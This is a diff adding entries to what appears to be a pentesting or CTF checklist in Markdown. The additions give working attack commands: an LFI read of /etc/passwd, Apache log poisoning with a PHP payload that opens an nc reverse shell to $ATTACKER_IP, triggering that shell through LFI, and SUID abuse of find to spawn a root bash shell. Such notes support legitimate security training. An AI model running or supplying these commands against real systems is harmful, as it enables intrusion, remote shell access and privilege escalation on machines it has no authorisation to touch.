@@ -168,6 +168,15 @@
 	- Check for config through URL's like
 	- hostname/username/re-use etc
 - LFI
+    - Find vulnerability
+    	- `curl http://$IP:$PORT?arg=../../../../../etc/passwd`
+    - Log Posining
+		- Attemp to poision log
+          - `echo "GET <?php echo 'TEST123' ?> HTTP/1.1" | nc $IP $PORT`
+		  - `echo "GET <?php system('nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT'); ?> HTTP/1.1" | nc $VICTIM_IP $VICTIM_PORT`
+        - Trigger to check if posioning was successful
+          - `curl http://$IP:$PORT?book=../../../../../var/log/apache2/access.log`
+          - This would initiate above create reverse shell.
 - check for ssh keys
 - check for service/app configuration file (e.g: /etc/tomcat7/tomcat-users)
 - vsftpd -> upload, to rce from upload file
@@ -223,6 +232,9 @@
 	- [ ] Take advantage of this misconfiguration by abusing the PATH variable
 	- [ ] Take advantage of misconfigured cronjob.
 	- [ ] `find / -perm -u=g -type f 2>/dev/null` -> Are there any GUID
+	- [ ] `ps ps auxwf` -> Check for any writeable
+	Or,
+	- [ ] `find / -type f -user root -perm /o=w | grep -v '/proc/`
 	- [ ] File transfer
 		- [ ] [Python http.server](../../tools/file-transfer#python-simple-http-server)
 	- [ ] simple HTTP server
@@ -239,6 +251,10 @@
 	- [ ] `kernel exploits?`
 		- [ ] https://github.com/mzet-/linux-exploit-suggester
 		- [ ] e.g Dirty Cow [example HowTo](practical/dirty_cow)
+	- [ ] `world writable exploit`
+    	- [ ] `echo "<?php system('chmod +s /usr/bin/find'); ?>" > /stuffed`
+    	- [ ] Using find related exploit
+        	- [ ] `find .-exec /bin/bash -p \; -quit`
 
 </details>
 
